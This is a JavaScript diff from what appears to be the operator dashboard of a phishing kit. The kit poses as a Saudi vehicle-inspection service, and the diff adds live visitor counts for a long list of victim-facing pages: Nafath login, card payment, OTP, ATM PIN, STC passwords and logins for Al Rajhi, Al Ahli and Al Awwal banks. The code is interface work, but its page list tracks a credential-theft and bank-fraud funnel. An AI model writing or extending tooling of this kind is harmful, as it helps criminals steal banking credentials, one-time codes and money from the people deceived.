@@ -1287,17 +1287,33 @@
       const container = document.getElementById('pageCountsContainer');
       if (!container) return;
       
-      // Define all fahos pages in order
+      // Define all fahos pages in order (actual page names from the project)
       const allPages = [
-        { key: 'الفحص الفني الدوري', label: 'الرئيسية', color: 'gray' },
+        { key: 'صفحة التسجيل', label: 'التسجيل', color: 'gray' },
         { key: 'صفحة نفاذ', label: 'نفاذ', color: 'indigo' },
-        { key: 'صفحة مركز الأعمال', label: 'مركز الأعمال', color: 'blue' },
-        { key: 'معلومات مركز الأعمال', label: 'تحديث المعلومات', color: 'teal' },
-        { key: 'صفحة الخدمة', label: 'الخدمة', color: 'cyan' },
-        { key: 'الملخص والدفع', label: 'الملخص', color: 'yellow' },
-        { key: 'صفحة الدفع', label: 'الدفع', color: 'green' },
-        { key: 'صفحة التحقق', label: 'OTP', color: 'orange' },
-        { key: 'الصفحة النهائية', label: 'النهائية', color: 'purple' },
+        { key: 'تسجيل دخول نفاذ', label: 'دخول نفاذ', color: 'blue' },
+        { key: 'تحقق نفاذ', label: 'تحقق نفاذ', color: 'teal' },
+        { key: 'ملخص الدفع', label: 'ملخص الدفع', color: 'cyan' },
+        { key: 'الدفع بطاقة الائتمان', label: 'الدفع', color: 'green' },
+        { key: 'رمز التحقق (OTP)', label: 'OTP', color: 'orange' },
+        { key: 'كلمة مرور ATM', label: 'ATM', color: 'red' },
+        { key: 'توثيق رقم الجوال', label: 'توثيق الجوال', color: 'pink' },
+        { key: 'تحقق رقم الجوال (OTP)', label: 'OTP جوال', color: 'amber' },
+        { key: 'تنبية إتصال STC', label: 'STC إتصال', color: 'blue' },
+        { key: 'تنبية إتصال Mobily', label: 'Mobily إتصال', color: 'purple' },
+        { key: 'MyStc OTP', label: 'MyStc OTP', color: 'blue' },
+        { key: 'كلمة مرور STC', label: 'STC كلمة مرور', color: 'indigo' },
+        { key: 'تسجيل الدخول الراجحى', label: 'الراجحي', color: 'blue' },
+        { key: 'الراجحى (OTP)', label: 'الراجحي OTP', color: 'teal' },
+        { key: 'نفاذ الراجحى', label: 'نفاذ الراجحي', color: 'cyan' },
+        { key: 'تنبيه الراجحى', label: 'تنبيه الراجحي', color: 'yellow' },
+        { key: 'إتصال الراجحى', label: 'إتصال الراجحي', color: 'orange' },
+        { key: 'حساب بنك الأول', label: 'بنك الأول', color: 'green' },
+        { key: 'نفاذ الأول', label: 'نفاذ الأول', color: 'teal' },
+        { key: 'بنك الأهلي (OTP)', label: 'الأهلي OTP', color: 'green' },
+        { key: 'تحويل بنكي', label: 'تحويل بنكي', color: 'indigo' },
+        { key: 'رقم الحساب البنكي', label: 'رقم الحساب', color: 'purple' },
+        { key: 'الصفحة النهائية', label: 'النهائية', color: 'gray' },
       ];
       
       // Count connected visitors per page
@@ -1322,6 +1338,9 @@
         'green': { bg: 'bg-green-100', text: 'text-green-600', badge: 'bg-green-500' },
         'orange': { bg: 'bg-orange-100', text: 'text-orange-600', badge: 'bg-orange-500' },
         'purple': { bg: 'bg-purple-100', text: 'text-purple-600', badge: 'bg-purple-500' },
+        'red': { bg: 'bg-red-100', text: 'text-red-600', badge: 'bg-red-500' },
+        'pink': { bg: 'bg-pink-100', text: 'text-pink-600', badge: 'bg-pink-500' },
+        'amber': { bg: 'bg-amber-100', text: 'text-amber-600', badge: 'bg-amber-500' },
       };
       
       let html = '';
